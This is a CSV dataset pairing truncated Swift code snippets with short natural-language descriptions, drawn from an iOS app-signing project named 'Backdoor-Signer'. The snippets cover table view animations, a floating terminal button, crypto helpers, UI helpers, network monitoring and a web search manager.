id,language,folder,code_type,file_path,nl,code
1998,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","Function controller - implements controller functionality","func controller(_: NSFetchedResultsController<NSFetchRequestResult>,
didChange _: Any,
at indexPath: IndexPath?,
for type: NSFetchedResultsChangeType,
newIndexPath: IndexPath?)
{"
1999,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","Function controllerDidChangeContent - implements controllerdidchangecontent functionality","func controllerDidChangeContent(_: NSFetchedResultsController<NSFetchRequestResult>) {
tableView?.endUpdates()
}
}

// MARK: - SkeletonLoadingCell

/// A table view cell that shows a skeleton loading animation
class SkeletonLoadingCell: UITableViewCell {"
2000,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - SkeletonLoadingCell / A table view cell that shows a skeleton loading animation","class SkeletonLoadingCell: UITableViewCell {
// MARK: - UI Components

private let containerView = UIView()
private let iconView = UIView()
private let titleView = UIView()
private let subtitleView = UIView()

// MARK: - Animation Layers
"
2001,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - Setup","private func setupViews() {
selectionStyle = .none
backgroundColor = .clear

// Add container view
containerView.backgroundColor = .systemBackground
containerView.layer.cornerRadius = 8
containerView.clipsToBounds = true
containerView.translatesAutoresizingMaskIntoConstraints = false
contentView.addSubview(containerView)"
2002,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","Function addGradientLayers - implements addgradientlayers functionality","private func addGradientLayers() {
let views = [iconView, titleView, subtitleView]

for view in views {"
2003,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - Animation","func startAnimating() {
// Create animation for shimmer effect
let animation = CABasicAnimation(keyPath: ""locations"")
animation.fromValue = [-1.0, -0.5, 0.0] // Start positions
animation.toValue = [1.0, 1.5, 2.0] // End positions
animation.duration = 1.5
animation.repeatCount = .infinity

// Add animation to gradient layers
for layer in animationLayers {"
2004,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","Function stopAnimating - implements stopanimating functionality","func stopAnimating() {
// Remove animations
for layer in animationLayers {"
2005,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - Layout","override func layoutSubviews() {
super.layoutSubviews()

// Update gradient layer frames
for (index, layer) in animationLayers.enumerated() {"
2006,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift","MARK: - Lifecycle","override func didMoveToWindow() {
super.didMoveToWindow()

if window != nil {"
2007,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","/ Manages the floating terminal button across the app","final class TerminalButtonManager {
// Singleton instance
static let shared = TerminalButtonManager()

// UI components
private let floatingButton = FloatingTerminalButton()

// Thread-safe state tracking
private let stateQueue = DispatchQueue(label: ""com.backdoor.terminalButtonState"", qos: .userInteractive)
private var _isPresentingTerminal = false"
2008,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function configureFloatingButton - implements configurefloatingbutton functionality","private func configureFloatingButton() {
// Ensure it's above other views but below AI button
floatingButton.layer.zPosition = 998
floatingButton.isUserInteractionEnabled = true

// Start position check timer for continuous accessibility
startPositionCheckTimer()
}

private func startPositionCheckTimer() {"
2009,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function startPositionCheckTimer - implements startpositionchecktimer functionality","private func startPositionCheckTimer() {
// Invalidate existing timer if any
positionCheckTimer?.invalidate()

// Create a new timer that periodically checks button position
positionCheckTimer = Timer.scheduledTimer(withTimeInterval: 30.0, repeats: true) { [weak self] _ in"
2010,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function checkButtonAccessibility - implements checkbuttonaccessibility functionality","private func checkButtonAccessibility() {
// Skip if button is hidden or not in a view
guard !floatingButton.isHidden, floatingButton.superview != nil else { return }"
2011,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function setupObservers - sets upobservers","private func setupObservers() {
// Observe orientation changes
NotificationCenter.default.addObserver(
self,
selector: #selector(handleOrientationChange),
name: UIDevice.orientationDidChangeNotification,
object: nil
)

// Observe interface style changes"
2012,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleKeyboardWillShow - implements handlekeyboardwillshow functionality","@objc private func handleKeyboardWillShow(_ notification: Notification) {
guard !isPresentingTerminal, !floatingButton.isHidden,
let keyboardFrame = notification.userInfo?[UIResponder.keyboardFrameEndUserInfoKey] as? CGRect,
let parentVC = parentViewController else { return }"
2013,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleKeyboardWillHide - implements handlekeyboardwillhide functionality","@objc private func handleKeyboardWillHide(_ notification: Notification) {
// Reset button position when keyboard hides
if !isPresentingTerminal && !floatingButton.isHidden {"
2014,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleTabChange - implements handletabchange functionality","@objc private func handleTabChange(_: Notification) {
// Skip if app is inactive
guard isAppActive else {"
2015,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function attachToRootView - implements attachtorootview functionality","private func attachToRootView() {
// Skip if presenting terminal
guard !isPresentingTerminal else {"
2016,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleOrientationChange - implements handleorientationchange functionality","@objc private func handleOrientationChange() {
DispatchQueue.main.async { [weak self] in"
2017,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function updateButtonPosition - updates buttonposition","private func updateButtonPosition() {
// Skip if button is hidden or app inactive
guard !floatingButton.isHidden, isAppActive else { return }"
2018,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleAppDidBecomeActive - implements handleappdidbecomeactive functionality","@objc private func handleAppDidBecomeActive() {
isAppActive = true

DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) { [weak self] in"
2019,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleAppWillResignActive - implements handleappwillresignactive functionality","@objc private func handleAppWillResignActive() {
isAppActive = false
hide()

// Invalidate timer when app is inactive
positionCheckTimer?.invalidate()
positionCheckTimer = nil
}

@objc private func updateButtonAppearance() {"
2020,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function updateButtonAppearance - updates buttonappearance","@objc private func updateButtonAppearance() {
DispatchQueue.main.async { [weak self] in"
2021,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","/ Show the terminal button","func show() {
DispatchQueue.main.async { [weak self] in"
2022,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","/ Hide the terminal button","func hide() {
DispatchQueue.main.async { [weak self] in"
2023,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function handleTerminalRequest - implements handleterminalrequest functionality","@objc private func handleTerminalRequest() {
// Ensure we're on main thread
if !Thread.isMainThread {"
2024,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift","Function dismissTerminal - implements dismissterminal functionality","@objc private func dismissTerminal() {
guard let presentingVC = UIApplication.shared.topMostViewController()?.presentingViewController else {"
2025,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift","/ Helper for basic cryptography operations using native iOS libraries","class CryptoHelper {
// Singleton instance
static let shared = CryptoHelper()

private init() {}"
2026,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift","MARK: - Encryption Methods / Encrypt data using AES with a password / - Parameters: /   - data: Data to encrypt /   - password: Password for encryption / - Returns: Encrypted data as a base64 string","func encryptAES(_ data: Data, password: String) -> String? {
// Generate a key from the password
guard let key = deriveKeyData(from: password, salt: ""backdoorsalt"", keyLength: 32) else {"
2027,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift","MARK: - Helper Methods / Derive a key from a password using PBKDF2 / - Parameters: /   - password: The password to derive the key from /   - salt: Salt for the key derivation /   - keyLength: Length of the key to generate in bytes / - Returns: The derived key as Data","func deriveKeyData(from password: String, salt: String, keyLength: Int) -> Data? {
guard let passwordData = password.data(using: .utf8),
let saltData = salt.data(using: .utf8) else {"
2028,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift","/ Generate random bytes for cryptographic operations / - Parameter length: Number of random bytes to generate / - Returns: Data containing random bytes","func generateRandomBytes(length: Int) -> Data {
var randomBytes = [UInt8](repeating: 0, count: length)
let status = SecRandomCopyBytes(kSecRandomDefault, length, &randomBytes)

if status == errSecSuccess {"
2029,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift","/ Calculate CRC32 checksum for data / - Parameter data: The data to calculate checksum for / - Returns: CRC32 checksum as UInt32","func crc32(of data: Data) -> UInt32 {
// Initialize with all bits set
var checksum: UInt32 = 0xFFFFFFFF

// Process each byte
data.forEach { byte in"
2030,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","MARK: - UIView Extensions for AutoLayout","extension UIView {
/// Set up constraints with native AutoLayout
/// - Parameter constraints: Array of constraints to activate
func setupConstraints(_ constraints: [NSLayoutConstraint]) {"
2031,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Set up constraints with native AutoLayout / - Parameter constraints: Array of constraints to activate","func setupConstraints(_ constraints: [NSLayoutConstraint]) {
translatesAutoresizingMaskIntoConstraints = false
NSLayoutConstraint.activate(constraints)
}

/// Set up constraints with a closure
/// - Parameter setup: Closure that returns constraints to activate
func setupConstraints(_ setup: (UIView) -> [NSLayoutConstraint]) {"
2032,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Set up constraints with a closure / - Parameter setup: Closure that returns constraints to activate","func setupConstraints(_ setup: (UIView) -> [NSLayoutConstraint]) {
translatesAutoresizingMaskIntoConstraints = false
NSLayoutConstraint.activate(setup(self))
}

/// Update existing constraints
/// - Parameter update: Closure that performs constraint updates
func updateConstraints(_ update: () -> Void) {"
2033,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Update existing constraints / - Parameter update: Closure that performs constraint updates","func updateConstraints(_ update: () -> Void) {
update()
layoutIfNeeded()
}

/// Create a stack view with standard configuration
/// - Parameters:
///   - axis: Axis for the stack view
///   - spacing: Spacing between items
///   - views: Views to add to the stack"
2034,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Create a stack view with standard configuration / - Parameters: /   - axis: Axis for the stack view /   - spacing: Spacing between items /   - views: Views to add to the stack /   - insets: Insets to apply to the stack view / - Returns: Configured UIStackView","static func createStack(axis: NSLayoutConstraint.Axis,
spacing: CGFloat = 8,
views: [UIView],
insets: UIEdgeInsets = .zero) -> UIStackView
{"
2035,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","MARK: - Internal Animation Helper","class InternalAnimationHelper {
/// Add an animated icon to a view (replacement for Lottie)
/// - Parameters:
///   - systemName: SF Symbol name
///   - view: Parent view to add the animation to
///   - loopMode: Animation loop mode (continuous, once, etc.)
///   - size: Size for the animation view
/// - Returns: The configured UIImageView
static func addAnimation(systemName: String, to view: UIView,
loopMode _: UIView.AnimationRepeatCount = .infinity,"
2036,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Add an animated icon to a view (replacement for Lottie) / - Parameters: /   - systemName: SF Symbol name /   - view: Parent view to add the animation to /   - loopMode: Animation loop mode (continuous, once, etc.) /   - size: Size for the animation view / - Returns: The configured UIImageView","static func addAnimation(systemName: String, to view: UIView,
loopMode _: UIView.AnimationRepeatCount = .infinity,
size: CGSize? = nil) -> UIImageView
{"
2037,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Show an animated loading indicator / - Parameters: /   - view: View to add the loader to /   - message: Optional message to display / - Returns: Container view with the animation that can be removed later","static func showLoader(in view: UIView, message: String? = nil) -> UIView {
// Create container for the loader
let container = UIView()
container.backgroundColor = UIColor.black.withAlphaComponent(0.3)
container.translatesAutoresizingMaskIntoConstraints = false
view.addSubview(container)

// Set constraints for full screen
NSLayoutConstraint.activate([
container.topAnchor.constraint(equalTo: view.topAnchor),"
2038,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Hide the loader / - Parameter container: Container view returned by showLoader","static func hideLoader(_ container: UIView) {
UIView.animate(withDuration: 0.3, animations: {"
2039,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","MARK: - Internal UI Components","class InternalUIComponents {
/// Create a beautifully styled button with gradient
/// - Parameters:
///   - title: Button title
///   - colors: Gradient colors (default blue gradient)
///   - cornerRadius: Corner radius (default 12)
///   - fontSize: Font size (default 16)
/// - Returns: Configured button
static func createGradientButton(title: String,
colors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],"
2040,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Create a beautifully styled button with gradient / - Parameters: /   - title: Button title /   - colors: Gradient colors (default blue gradient) /   - cornerRadius: Corner radius (default 12) /   - fontSize: Font size (default 16) / - Returns: Configured button","static func createGradientButton(title: String,
colors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],
cornerRadius: CGFloat = 12,
fontSize: CGFloat = 16) -> UIButton
{"
2041,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Create a card view with shadow / - Parameters: /   - backgroundColor: Card background color /   - cornerRadius: Corner radius / - Returns: Configured card view","static func createCardView(backgroundColor: UIColor = .systemBackground,
cornerRadius: CGFloat = 16) -> UIView
{"
2042,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Create a beautiful text field with floating label / - Parameters: /   - placeholder: Placeholder text /   - backgroundColor: Background color /   - borderColor: Border color / - Returns: Configured text field with container","static func createFloatingTextField(placeholder: String,
backgroundColor: UIColor = .systemBackground,
borderColor: UIColor = .systemGray4) -> UIView
{"
2043,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Extension to define animation repeat options","extension UIView {
enum AnimationRepeatCount: Equatable {"
2044,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","enum AnimationRepeatCount - implements functionality related to animation repeat count","enum AnimationRepeatCount: Equatable {
case once
case finite(count: Int)
case infinity

var floatValue: Float {"
2045,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift","/ Network connectivity status","enum ConnectionType {
case wifi
case cellular
case ethernet
case unknown
}

/// Class for monitoring network connectivity status
class NetworkMonitor {"
2046,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift","/ Class for monitoring network connectivity status","class NetworkMonitor {
// MARK: - Properties

/// Singleton instance
static let shared = NetworkMonitor()

/// Network path monitor
private let monitor = NWPathMonitor()

/// Monitor queue"
2047,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift","MARK: - Public Methods / Start monitoring network status","func startMonitoring() {
monitor.pathUpdateHandler = { [weak self] path in"
2048,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift","/ Stop monitoring network status","func stopMonitoring() {
monitor.cancel()
}

/// Check if the current connection is expensive (cellular)
var isExpensiveConnection: Bool {"
2049,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift","MARK: - Private Methods / Update the current connection type based on the network path","private func updateConnectionType(_ path: NWPath) {
if path.usesInterfaceType(.wifi) {"
2050,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift","/ Check if the device has been offline for a significant period","func hasBeenOfflineForExtendedPeriod() -> Bool {
guard !isConnected else { return false }"
2051,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift","class SourceRefreshOperation - implements functionality related to source refresh operation","@objc class SourceRefreshOperation: Operation, @unchecked Sendable {
private let queue = DispatchQueue(label: ""kh.crysalis.backdoor.sourcerefresh"", qos: .userInitiated)
private let isDebugMode: Bool = {"
2052,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift","Function main - implements main functionality","override func main() {
guard !isCancelled else { return }"
2053,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift","Function checkForUpdates - implements checkforupdates functionality","private func checkForUpdates(with sourceData: [(data: SourcesData, url: URL)]) {
let coreDataQueue = DispatchQueue(label: ""kh.crysalis.backdoor.coredata"", qos: .userInitiated)

coreDataQueue.sync {"
2054,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift","Function cleanVersion - implements cleanversion functionality","private func cleanVersion(_ version: String) -> String {
// find first occurrence of version pattern X.Y.Z
let pattern = ""\\d+(\\.\\d+)+""
if let range = version.range(of: pattern, options: .regularExpression) {"
2055,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift","Function compareVersions - implements compareversions functionality","private func compareVersions(_ v1: String, _ v2: String) -> Int {
let cleanV1 = cleanVersion(v1)
let cleanV2 = cleanVersion(v2)

let v1Components = cleanV1.split(separator: ""."").compactMap { Int($0) }"
2056,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift","Function createMockSource - creates mocksource","func createMockSource(completion: @escaping (SourcesData?) -> Void) {
let signedApps = CoreDataManager.shared.getDatedSignedApps()
Debug.shared.log(
message: ""Debug mode: Found \(signedApps.count) signed app\(signedApps.count == 1 ? """" : ""s"")"",
type: .info
)

if let firstApp = signedApps.first {"
2057,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Data Structures / Source type for categorizing search results","enum SourceType {
case web
case academic
case news
case social
case database
case unknown
}

/// Search depth levels for different search intensities"
2058,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Search depth levels for different search intensities","enum SearchDepth: Int {
case standard = 0 // Basic search
case enhanced = 1 // Follow top links
case deep = 2 // Follow multiple links with recursive crawling
case specialized = 3 // Domain-specific searches (academic, news, etc.)
}

/// Basic search result model
struct WebSearchResult {"
2059,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Basic search result model","struct WebSearchResult {
let title: String
let description: String
let url: URL
var sourceType: SourceType = .web
}

/// Enhanced search result with additional metadata
struct DeepSearchResult {"
2060,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Enhanced search result with additional metadata","struct DeepSearchResult {
var title: String = """"
var description: String = """"
var url: URL?
var keywords: [String] = []
var sentiment: Double = 0.0
var relatedContent: [String: String] = [:]
var sourceType: SourceType = .web
var contentSummary: String = """"
var extractedDate: Date?"
2061,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Structure to hold extracted page data","struct PageData {
var content: String
var keywords: [String]
var sentiment: Double = 0.0
var relatedContent: [String: String] = [:]
var entities: [String: String] = [:]
var links: [URL] = []
var imageURLs: [URL] = []
var extractedDate: Date?
}"
2062,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Search cache entry","struct SearchCacheEntry {
let results: [DeepSearchResult]
let timestamp: Date
let query: String
let depth: SearchDepth
}

/// Possible search errors
enum SearchError: Error {"
2063,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Possible search errors","enum SearchError: Error {
case invalidQuery
case networkError(Error)
case parsingError
case emptyResults
case rateLimitExceeded
case accessDenied
case timeout
case crawlFailed
case unsupportedSourceType"
2064,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Main Manager Class / Enhanced web search manager with deep search capabilities","class WebSearchManager {
// Singleton instance
static let shared = WebSearchManager()

// Configuration properties
private let maxConcurrentRequests = 5
private let requestTimeout: TimeInterval = 10
private let maxCacheAgeMins: Double = 30
private let maxSearchDepth = 3
private let maxResultsPerSearch = 20"
2065,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Public API / Performs a standard web search for the given query / - Parameters: /   - query: The search query string /   - completion: Callback with search results or error","func performSearch(query: String, completion: @escaping (Result<[WebSearchResult], Error>) -> Void) {
Debug.shared.log(message: ""Performing standard web search for: \(query)"", type: .info)

// Check privacy settings before proceeding
guard privacyManager.isSearchEnabled else {"
2066,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Performs a deep search with configurable depth and specialized sources / - Parameters: /   - query: The search query string /   - depth: How deep to search (affects crawling depth and source diversity) /   - sourceTypes: What types of sources to include /   - completion: Callback with enhanced search results or error","func performDeepSearch(
query: String,
depth: SearchDepth = .enhanced,
sourceTypes: [SourceType] = [.web, .news, .academic],
completion: @escaping (Result<[DeepSearchResult], Error>) -> Void
) {"
2067,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Cancel an active search session","func cancelAllSearches() {
sessionQueue.sync {"
2068,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Format deep search results as a readable string","func formatDeepSearchResults(_ results: [DeepSearchResult]) -> String {
var formattedResults = """"

for (index, result) in results.prefix(5).enumerated() {"
2069,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Format standard search results as a readable string / This method is needed by CustomAIService+DeepSearch","func formatSearchResults(_ results: [WebSearchResult]) -> String {
var formattedResults = """"

for (index, result) in results.prefix(5).enumerated() {"
2070,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Private Methods - Search Processing / Process standard search results from raw data","private func processSearchResults(
data: Data,
query: String,
completion: @escaping (Result<[WebSearchResult], Error>) -> Void
) {"
2071,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Extract structured search results from DuckDuckGo response","private func extractSearchResults(from json: [String: Any]) -> [WebSearchResult]? {
var results: [WebSearchResult] = []

// Extract the AbstractText if available (featured snippet)
if let abstractText = json[""AbstractText""] as? String,
!abstractText.isEmpty,
let abstractURL = json[""AbstractURL""] as? String,
let url = URL(string: abstractURL)
{"
2072,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Detect the source type based on URL and title","private func detectSourceType(url: URL, title _: String) -> SourceType {
let domain = url.host?.lowercased() ?? """"
let path = url.path.lowercased()

// Academic sources
if domain.contains(""scholar.google"") ||
domain.contains(""sciencedirect"") ||
domain.contains(""researchgate"") ||
domain.contains(""academia.edu"") ||
domain.contains(""ieee.org"") ||"
2073,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Private Methods - Deep Search / Web crawling function to follow links for deeper context","private func crawlPage(url: URL, depth: Int, completion: @escaping (PageData?) -> Void) {
// Skip if depth is 0 or privacy disallows crawling
guard depth > 0, privacyManager.isCrawlingEnabled else {"
2074,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Perform specialized search using specific APIs based on source type","private func performSpecializedSearch(
query: String,
sourceTypes: [SourceType],
completion: @escaping ([DeepSearchResult]) -> Void
) {"
2075,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Search academic sources","private func searchAcademic(query: String, completion: @escaping ([DeepSearchResult]) -> Void) {
// This would normally use a specialized API like Semantic Scholar
// For now, use a simplified implementation

guard let encodedQuery = query.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) else {"
2076,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Search news sources","private func searchNews(query: String, completion: @escaping ([DeepSearchResult]) -> Void) {
// This would normally use a specialized API like News API
// For now, use a simplified implementation

guard let encodedQuery = query.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) else {"
2077,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Private Methods - Content Extraction / Extract the main content from HTML","private func extractMainContent(from html: String) -> String {
// Remove scripts, styles, and headers
let cleanedHtml = html
.replacingOccurrences(of: ""<script[^>]*>.*?</script>"", with: """", options: .regularExpression)
.replacingOccurrences(of: ""<style[^>]*>.*?</style>"", with: """", options: .regularExpression)
.replacingOccurrences(of: ""<header[^>]*>.*?</header>"", with: """", options: .regularExpression)
.replacingOccurrences(of: ""<nav[^>]*>.*?</nav>"", with: """", options: .regularExpression)
.replacingOccurrences(of: ""<footer[^>]*>.*?</footer>"", with: """", options: .regularExpression)

// Extract text from main content tags"
2078,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Extract links from HTML","private func extractLinks(from html: String, baseURL: URL) -> [URL] {
var links: [URL] = []
let pattern = ""<a[^>]+href=[\""']([^\""']+)[\""'][^>]*>""

do {"
